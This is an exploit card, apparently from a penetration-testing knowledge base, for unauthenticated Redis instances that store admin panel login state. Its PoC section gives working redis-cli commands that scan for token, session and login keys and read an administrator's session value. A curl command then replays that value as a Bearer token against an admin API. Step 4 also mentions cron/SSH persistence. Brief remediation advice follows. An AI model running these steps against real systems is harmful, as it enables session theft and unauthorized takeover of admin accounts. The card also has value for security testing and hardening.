---
title: Unauthenticated Redis → steal admin sessions / tokens for direct admin access
cve: None (configuration flaw)
severity: critical
cvss: 9.1
product: Custom admin panels (sessions/tokens stored in Redis)
versions: Any
ports: 6379
keywords: redis, unauthenticated access, session, token, admin panel, takeover
entry: login/session/token keys in Redis
verified: false
sources: Compiled from public sources (configuration flaws)
---

## Fingerprints

```
redis-cli -h target ping          → PONG (unauthenticated access)
redis-cli -h target info          → Version and keyspace
```

## Prerequisites

- Redis is exposed without a password; the application stores login state in Redis (most Java/PHP admin panels).

## PoC

```bash
# 1) Confirm unauthenticated access
redis-cli -h target ping

# 2) Find login-state keys
redis-cli -h target --scan --pattern '*token*'  | head
redis-cli -h target --scan --pattern '*session*' | head
redis-cli -h target --scan --pattern '*login*'  | head

# 3) Retrieve an administrator session value (JSON or serialized string)
redis-cli -h target get "login_tokens:<uuid>"
# Confirmation: value contains userId=1 / admin / roles = direct impersonation possible
```

```bash
# 4) Call the admin API using the token
curl -s 'https://target/api/admin/user/list' -H 'Authorization: Bearer <token-value>' | head -c 200
```

## Exploitation Steps

1. Start with ping (non-destructive);
2. Scan the three `token/session/login` key categories and select one whose principal is an administrator;
3. Verify by calling the endpoint directly with the value;
4. Consider writing cron/SSH only if persistence is needed (a separate chain; do not perform it here);
5. Evidence: key name + userId/roles in the value (redacted) + endpoint 200 response.

## Remediation and Mitigation

- Password-protect Redis + bind only to internal interfaces + disable dangerous commands (rename-command CONFIG "");
- Sign login state/bind it to IP+UA and shorten TTL.

## References

- Redis security baseline; OWASP session management.
